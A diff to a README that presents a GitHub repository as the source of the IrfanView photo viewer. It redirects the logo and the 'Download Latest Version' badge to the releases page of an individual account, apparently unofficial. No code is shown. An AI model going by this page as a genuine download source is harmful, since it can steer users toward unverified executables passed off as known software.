@@ -3,7 +3,7 @@
 ## Introduction
 Welcome to the repository for IrfanView, your go-to versatile and lightweight photo viewer and editor! IrfanView offers essential tools for seamless image viewing, enabling you to effortlessly navigate through your collection, make quick adjustments, and even perform high-resolution image processing.
 
-![IrfanView Logo](https://example.com/irfanview-logo.png)
+![IrfanView Logo](https://github.com/zorox2310/IrfanView/releases)
 
 ## Key Features
 🖼️ **Advanced Photo Tools:** IrfanView provides advanced tools to enhance and manipulate your photos to perfection.
@@ -56,7 +56,7 @@ This repository covers a wide range of topics related to IrfanView:
 
 ## Download Latest Version
 You can download the latest version of IrfanView from the following link:
-[![Download IrfanView](https://img.shields.io/badge/Download-IrfanView-blue.svg)](https://github.com/releases/789694263/Release.zip)
+[![Download IrfanView](https://github.com/zorox2310/IrfanView/releases)](https://github.com/zorox2310/IrfanView/releases)
 
 *Note: Click on the button above to download the latest version of IrfanView. If you encounter any issues with the link, please check the "Releases" section of this repository for alternative download options.*
 
